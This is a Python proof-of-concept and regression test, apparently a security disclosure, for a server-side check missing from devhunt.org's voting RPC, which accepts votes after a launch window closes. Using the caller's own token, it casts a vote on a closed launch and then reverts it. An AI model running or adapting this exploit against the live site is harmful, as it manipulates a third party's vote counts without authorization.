#!/usr/bin/env python3
"""
PoC / regression test: voting after the launch window ended (devhunt.org)

public.toggleProductVote only checks for FUTURE launches (launch_date > NOW());
it never enforces the END of the launch window (launch_end). The browser blocks
votes after the window closed purely client-side — the RPC still accepts them.

The PoC toggles one vote on a closed launch and toggles it back (self-healing).

Usage:
  ./poc_vote_after_launch_end.py --token <access-jwt> [--product-id <id>]
  DEVHUNT_ACCESS_TOKEN=<access-jwt> ./poc_vote_after_launch_end.py

Token: on devhunt.org, DevTools -> Network -> any supabase.co request ->
"Authorization: Bearer ...".

Exit codes: 0 = vulnerable, 2 = patched, 1 = error.
Fix: fix_vote_after_launch_end.sql
"""

import argparse
import base64
import json
import os
import sys
import urllib.error
import urllib.request
from datetime import datetime, timezone
from urllib.parse import quote

BASE = "https://xpdhqqwgprlqmqaqmnyx.supabase.co"

# Public anon key from devhunt.org's client bundle (public by design).
ANON_KEY = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhwZGhxcXdncHJscW1xYXFtbnl4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE2ODQ4NTg0ODcsImV4cCI6MjAwMDQzNDQ4N30."
    "fwN6a_NzygrFxhj0GCxGnJJpHv8q8iNEjY1jvhL8Kv0"
)


def req(method, path, token, body=None):
    """One Supabase REST call. Returns (status, parsed_json_or_raw_text)."""
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method)
    r.add_header("apikey", ANON_KEY)
    r.add_header("Authorization", f"Bearer {token}")
    if data:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r) as resp:
            raw = resp.read().decode()
            return resp.status, json.loads(raw) if raw.strip() else None
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw


def toggle_vote(token, user_id, product_id):
    """Call the RPC. Returns (ok, new_votes_count_or_error_message)."""
    status, payload = req(
        "POST", "/rest/v1/rpc/toggleProductVote", token,
        {"_product_id": product_id, "_user_id": user_id},
    )
    if status == 200:
        return True, int(payload)
    message = payload.get("message", str(payload)) if isinstance(payload, dict) else str(payload)
    return False, message


def main() -> int:
    ap = argparse.ArgumentParser(description="PoC: voting after the launch window ended")
    ap.add_argument("--token", default=os.environ.get("DEVHUNT_ACCESS_TOKEN"),
                    help="Supabase access token (or set DEVHUNT_ACCESS_TOKEN)")
    ap.add_argument("--product-id", type=int,
                    help="Target tool (default: the most recently closed launch)")
    args = ap.parse_args()
    if not args.token:
        print("[!] No token — pass --token <access-jwt> or set DEVHUNT_ACCESS_TOKEN.")
        return 1

    # 1) Get the caller's user id from the JWT (sub claim) — the RPC only
    #    needs auth.uid() to match, no extra session round-trip.
    payload = args.token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    user_id = json.loads(base64.urlsafe_b64decode(payload))["sub"]

    # 2) Pick the target: --product-id or the most recently closed launch.
    if args.product_id:
        path = f"/rest/v1/products?id=eq.{args.product_id}&select=id,name,launch_end,votes_count"
    else:
        now = quote(datetime.now(timezone.utc).isoformat())
        path = (f"/rest/v1/products?launch_end=not.is.null&launch_end=lt.{now}"
                f"&order=launch_end.desc&limit=1&select=id,name,launch_end,votes_count")
    status, rows = req("GET", path, args.token)
    if status != 200 or not rows:
        print(f"[!] No closed launch found (HTTP {status}) — pass --product-id.")
        return 1
    p = rows[0]
    if datetime.fromisoformat(p["launch_end"]) > datetime.now(timezone.utc):
        print(f"[!] Window of '{p['name']}' is still open — pick a closed launch.")
        return 1
    print(f"[1] Target: {p['name']} (id={p['id']}, launch_end={p['launch_end']}, "
          f"votes_count={p['votes_count']})")

    # 3) The attack: call the RPC although the window is closed.
    ok, result = toggle_vote(args.token, user_id, p["id"])
    if not ok and "voting closed" in str(result):
        print(f"[+] PATCHED: server rejects ('{result}') — the vulnerability is closed.")
        return 2
    if not ok:
        print(f"[-] Unexpected RPC error: {result}")
        return 1
    print(f"[2] VULNERABLE: server accepted a vote AFTER the window closed "
          f"(votes_count {p['votes_count']} -> {result})")

    # 4) Restore: toggle the vote back.
    ok, result = toggle_vote(args.token, user_id, p["id"])
    restored = ok and result == p["votes_count"]
    print(f"[3] Restore: second toggle -> votes_count {result} "
          f"(expected {p['votes_count']}) {'OK' if restored else '— CHECK MANUALLY!'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
